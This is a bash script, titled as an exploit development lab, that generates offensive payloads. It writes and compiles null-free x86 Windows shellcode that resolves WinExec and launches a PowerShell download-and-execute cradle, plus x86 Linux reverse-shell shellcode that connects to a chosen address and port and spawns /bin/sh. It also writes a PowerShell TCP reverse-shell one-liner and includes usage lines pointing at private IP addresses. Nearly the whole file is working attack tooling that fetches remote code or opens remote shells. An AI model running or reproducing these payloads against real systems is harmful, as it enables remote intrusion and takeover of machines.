#!/bin/bash
function Exploit() {
  local _Title="Exploit Development Lab: Buffer Overflows";
  local _Verbose="";
  local _Command="$1"; shift;

  Info() {
    [[ -z "$1" ]] || echo "INFO ($(date)): ${@}";
    return 0;
  }
  Debug() {
    if [[ "${_Verbose}" ]]; then
      [[ -z "$1" ]] || echo "DEBUG ($(date)): ${@}";
    fi;
    return 0;
  }
  Error() {
    [[ -z "$1" ]] || echo "ERROR ($(date)): ${@}";
    return 1;
  }
  Exists() {
    test -f $1 || return 1;
    return 0;
  }
  CompileWindows(){
    Info "Generating Windows shellcode from: $1";
    Debug "CompileWindows ${@}";
    local _assembly="$1";
    if ! (Exists "${_assembly}"); then
      Error "Missing arguments: Exploit CompileWindows <FILE>";
      return 1;
    fi;
    nasm -f win32 ${_assembly} -o ${_assembly}.o;
    for i in $(objdump -D ${_assembly}.o|grep "^ "|cut -f2); do
      echo -n $i;
    done;echo;
    return 0;
  }
  CompileLinux(){
    Info "Generating Linux shellcode from: $1";
    Debug "CompileLinux ${@}";
    local _assembly="$1";
    if ! (Exists "${_assembly}"); then
      Error "Missing arguments: Exploit CompileLinux <FILE>";
      return 1;
    fi;
    nasm -f elf32 ${_assembly} -o ${_assembly}.o;
    for i in $(objdump -D ${_assembly}.o|grep "^ "|cut -f2); do
      echo -n $i;
    done;echo;
    return 0;
  }
  EncodeCommand() {
    Debug "EncodeCommand ${@}";
    if [[ -z "$2" ]]; then
      Error "Missing arguments: Exploit EncodeCommand <COMMAND...>";
      return 1;
    fi;
    cat << EOF | python3
#!/usr/bin/env python3
from __future__ import annotations
from struct import pack, unpack
from binascii import hexlify

def encode(command: list[str]) -> str:
    data: bytes = " ".join(command).encode()
    data: bytes = data.ljust(len(data) + (4 - (len(data) % 4)), b" ")
    buffer: list = [data[i:i+4] for i in range(0, len(data), 4)]
    buffer.reverse()
    return "\n".join([f"push 0x{hexlify(pack('<I', unpack('>I', byte)[0])).decode()}" for byte in buffer])

print(encode('${@}'.split(' ')))
EOF
    return 0;
  }
  EncodeAddress(){
    Debug "EncodeAddress ${@}";
    if [[ -z "$1" ]]; then
      Error "Missing arguments: Exploit EncodeAddress <ADDRESS>";
      return 1;
    fi;
    cat << EOF | python3
#!/usr/bin/env python3
from __future__ import annotations

def encode(address: str) -> str:
    ip = address.split(".")
    ip.reverse()
    return "".join([hex(int(oct)).lstrip("0x") for oct in ip])

print(f"0x{encode('${@}')}")
EOF
    return 0;
  }
  EncodePort(){
    Debug "EncodePort ${@}";
    if [[ -z "$1" ]]; then
      Error "Missing arguments: Exploit EncodePort <PORT>";
      return 1;
    fi;
    cat << EOF | python3
#!/usr/bin/env python3
from __future__ import annotations
from struct import pack
from binascii import hexlify

def encode(port: int | str) -> str:
    return hexlify(pack("<H",int(port))).decode()

print(f"0x{encode('${@}')}")
EOF
    return 0;
  }
  WindowsAssembly(){
    Info "Creating Windows x86 Execute Cradle assembly file: /tmp/x86-exec-cradle.asm";
    Debug "WindowsAssembly ${@}";
    if [[ -z "$2" ]]; then
      Error "Missing arguments: Exploit WindowsAssembly <COMMAND...>";
      return 1;
    fi;
    cat << EOF > /tmp/x86-exec-cradle.asm
; Description:
; * Position independent x86 shellcode free of null bytes that executes the WinExec() and ExitProcess() API calls
; * PowerShell process is spawned to download and execute a remote payload in memory via HTTP.
; Synopsis:
; * Function prolog to save the previous base pointer and prepare new stack pointer.
; * Dynamically resolve the base address of ntdll.dll by walking the PEB LDR structure.
; * Find the address of WinExec() by parsing the export table of ntdll.dll.
; * Prepare the lPCmdLine and uCmdShow arguments for the WinExec() call.
; * Execute the WinExec() API call to trigger the download cradle and invoke the payload in memory.

_start:
; Function prolog to save previous and prepare new stack pointers
 mov ebp, esp
 sub esp, 0x20

find_kernel32_base:
; Obtain kernel32 base by walking PEB->TEB->LDR
 xor ebx, ebx
 mov ebx, [fs:ebx+0x30]
 mov ebx, [ebx+0xC]
 mov ebx, [ebx+0x1C]
 mov ebx, [ebx]
 mov ebx, [ebx]
 mov eax, [ebx+0x8]
 mov [ebp-0x4], eax

find_export_table:
; Obtain address to export table from kernel32
 mov ebx, [eax+0x3C]
 add ebx, eax
 mov ebx, [ebx+0x78]
 add ebx, eax

find_name_table:
; Obtain address of Name Pointer Table from kernel32
 mov edi, [ebx+0x20]
 add edi, eax
 mov [ebp-0x8], edi

find_ordinal_table:
; Obtain address of Ordinal Table from kernel32
 mov ecx, [ebx+0x24]
 add ecx, eax
 mov [ebp-0xC], ecx

find_address_table:
; Obtain address of Address Table from kernel32
 mov edx, [ebx+0x1C]
 add edx, eax
 mov [ebp-0x10], edx

find_export_count:
; Obtain count of exported functions from Export Table
 mov edx, [ebx+0x14]
 mov [ebp-0x14], edx

; Skip to Cradle Execution function
jmp short exec_cradle

find_function:
; Set searched name count used in Find Loop
 xor eax, eax
 mov edx, [ebp-0x14]

find_loop:
; Iterate through the Name Pointer Table to locate WinExec()
 mov edi, [ebp-0x8]
 mov esi, [ebp+0x18]
 xor ecx, ecx
 cld
 mov edi, [edi+eax*4]
 add edi, [ebp-0x4]
 add cx, 0x8
 repe cmpsb
; Skip to Found Function if the name matches "WinExec"
 jz found_function
 inc eax
 cmp eax, edx
; Recursive call to Find Loop for next exported name
 jb find_loop

found_function:
; Calculate address of WinExec() via Ordinal Table and Address Table
 mov ecx, [ebp-0xC]
 mov edx, [ebp-0x10]
 mov ax,  [ecx + eax*2]
 mov eax, [edx + eax*4]
 add eax, [ebp-0x4]
 ret

exec_cradle:
; Main Cradle Execute function
 mov edx, 0x63657878
 shr edx, 8
 push edx
 push 0x456E6957
 mov [ebp+0x18], esp
; Jump to Find Function to begin search
 call find_function
 xor ecx, ecx
 push ecx

; Prepare lpCmdLine argument to execute the cradle
; Push value to stack: "powershell.exe -c iex(iwr http://192.168.43.128/reverse-tcp.ps1))"
$(EncodeCommand ${@})

; Prepare uCmdShow argument SW_SHOWNORMAL (0x01)
 mov ebx, esp
 inc ecx
; Push uCmdShow and lpCmdLine arguments to stack
 push ecx
 push ebx
; Execute API call WinExec([in] lpCmdLine, [in] uCmdShow);
 call eax

exit_process:
; Obtain address to ExitProcess() using Find Function
 xor ecx, ecx
 mov ecx, 0x73736501
 shr ecx, 8
 push ecx
 push 0x636F7250
 push 0x74697845
 mov [ebp+0x18], esp
 call find_function
; Prepare uExitCode argument SUCCESS (0x00)
 xor edx, edx
 push edx
; Execute API call ExitProcess([in] uExitCode);
 call eax
EOF
    return 0;
  }
  LinuxAssembly(){
    Info "Generating x86 Linux reverse shell assembly: /tmp/x86-reverse-tcp.asm";
    Debug "LinuxAssembly ${@}";
    if [[ -z "$2" ]]; then
      Error "Missing arguments: Exploit LinuxAssembly <ADDRESS> <PORT>";
      return 1;
    fi;
    local _address="$1";
    local _port="$2";
    cat << EOF > /tmp/x86-reverse-tcp.asm
; Description:
; * Position independent x86 shellcode free of null bytes that executes a reverse shell via execve()
; * Socket is connected, file descriptors duplicated, then /bin/sh is executed as an interactive shell.
; Synopsis:
; * Socket is first created using the socket() syscall
; * A connection to the remote endpoint using the connect() and sockets file descriptor.
; * The stdin, stdout, and stderr file descriptors are duplicated via dup2().
; * A syscall to execve() is leveraged to spawn /bin/sh bound to the connection.

global _start
section .text

_start:
; Begin execution with Socket function

socket:
; Create socket file descriptor as an endpoint for communication via socket()
    xor ecx, ecx
    mov ebx, ecx
; Prepare protocol argument TCP (edx 0x00)
    mul ebx
; Prepare type argument SOCK_STREAM (ecx 0x01)
    inc cl
; Prepare domain argument AF_INET (ebx 0x02)
    inc bl
    inc bl
; Prepare socket() syscall (eax 0x167)
    mov ax, 0x167
; Execute syscall socket(int domain, int type, int protocol);
    int 0x80

connect:
; Initiate a connection on a socket using the new file descriptor via connect()
; Prepare sockfd argument (ebx int sockfd)
    xchg ebx, eax
; Prepare sockaddr structure argument
    dec cl
    push ecx
; Prepare addrlen argument (edx 0x16)
    mov dl, 0x16
; Prepare IP address of addr argument on stack (192.168.43.128 0x802ba8c0)
    mov ecx, $(EncodeAddress "${_address}")
    push ecx
; Prepare TCP port of addr argument on stack (TCP 4444 0x5c11)
    push word $(EncodePort "${_port}")
; Prepare AF_INET family
    push word 0x02
    lea ecx, [esp]
; Prepare connect() syscall (eax 0x16a)
    mov ax, 0x16a
; Execute syscall connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    int 0x80

dup:
; Prepare registers for calls to dup2() with ebx containing the sockfd
    xor ecx, ecx
; Set count of file descriptors to duplicate: stdin, stdout, stderr
    mov cl, 0x3

dup2:
; Duplicate file descriptors for new connection using dup2()
    xor eax, eax
; Prepare dup2() syscall (eax 0x3f)
    mov al, 0x3f
; Decrease count for next descriptor
    dec cl
; Execute syscall dup2(int oldfd, int newfd);
    int 0x80
; Duplicate remaining descriptor if needed
    jnz dup2

execve:
; Execute program bound to duplicated file descriptors via execve()
    cdq
    mul edx
    lea ecx, [eax]
; Prepare pathname argument on stack /bin//sh
    mov esi, 0x68732f2f
    mov edi, 0x6e69622f
; Push null terminated pathname to stack
    push ecx
    push esi
    push edi
; Set pathname argument
    lea ebx, [esp]
; Prepare execve() syscall (eax 0x0b)
    mov al, 0xb
; Execute syscall execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
    int 0x80
EOF
    return 0;
  }
  WindowsShellcode(){
    Info "Generating Windows shellcode";
    Debug "WindowsShellcode ${@}";
    if [[ -z "$2" ]]; then
      Error "Missing arguments: Exploit WindowsShellcode <COMMAND...>";
      return 1;
    fi;
    WindowsAssembly ${@} || (Error "Failed to generate assembly"; return 1);
    CompileWindows "/tmp/x86-exec-cradle.asm" || (Error "Failed to compile shellcode"; return 1);
    return 0;
  }
  LinuxShellcode(){
    Info "Generating Linux shellcode";
    Debug "LinuxShellcode ${@}";
    if [[ -z "$2" ]]; then
      Error "Missing arguments: Exploit LinuxShellcode <ADDRESS> <PORT>";
      return 1;
    fi;
    LinuxAssembly ${@} || (Error "Failed to generate assembly"; return 1);
    CompileLinux "/tmp/x86-reverse-tcp.asm" || (Error "Failed to compile shellcode"; return 1);
    return 0;
  }
  WindowsPayload(){
    Info "Creating Windows PowerShell payload file: /tmp/reverse-tcp.ps1";
    Debug "WindowsPayload ${@}";
    if [[ -z "$2" ]]; then
      Error "Missing arguments: Exploit WindowsPayload <ADDRESS> <PORT>";
      return 1;
    fi;
    local _address="$1";
    local _port="$2";
    cat << EOF > /tmp/reverse-tcp.ps1
\$c=[net.sockets.tcpclient]::new("${_address}",${_port});\$s=\$c.getstream();\$b=[byte[]]::new(65535);\$t=[text.asciiencoding]::new();while((\$i=\$s.read(\$b,0,\$b.length))-ne0){\$o=\$t.getbytes("\$((iex(\$t.getstring(\$b,0,\$i))2>&1|out-string))\`n\$pwd>");\$s.write(\$o,0,\$o.length);\$s.flush()};\$c.close();
EOF
    if ! (Exists "/tmp/reverse-tcp.ps1"); then
      Error "Failed to generate payload";
    fi;
    return 0;
  }
  case "$_Command" in
    *"LinuxAssembly"*)
      LinuxAssembly ${@};
      ;;
    *"WindowsAssembly"*)
      WindowsAssembly ${@};
      ;;
    *"EncodePort"*)
      EncodePort ${@};
      ;;
    *"EncodeAddress"*)
      EncodeAddress ${@};
      ;;
    *"EncodeCommand"*)
      EncodeCommand ${@};
      ;;
    *"CompileLinux"*)
      CompileLinux ${@};
      ;;
    *"CompileWindows"*)
      CompileWindows ${@};
      ;;
    *"WindowsShellcode"*)
      WindowsShellcode ${@};
      ;;
    *"LinuxShellcode"*)
      LinuxShellcode ${@};
      ;;
    *"WindowsPayload"*)
      WindowsPayload ${@};
      ;;
    *"help"*)
      echo "
        # ${_Title} #

        # Usage:
          Exploit WindowsShellcode 'powershell.exe -c iex(iwr http://172.31.24.110/reverse-tcp.ps1)'
          Exploit LinuxShellcode '172.31.24.110' '443'
          Exploit WindowsPayload '172.31.24.110' '443'

        # Commands:
          Exploit CompileWindows <FILE>
          Exploit CompileLinux <FILE>
          Exploit EncodeCommand <COMMAND...>
          Exploit EncodeAddress <ADDRESS>
          Exploit EncodePort <PORT>
          Exploit WindowsAssembly <COMMAND...>
          Exploit LinuxAssembly <ADDRESS> <PORT>
          Exploit WindowsShellcode <COMMAND...>
          Exploit LinuxShellcode <ADDRESS> <PORT>
          Exploit WindowsPayload <ADDRESS> <PORT>
          Exploit help
      ";
      ;;
    *)
  esac;
}

Exploit help;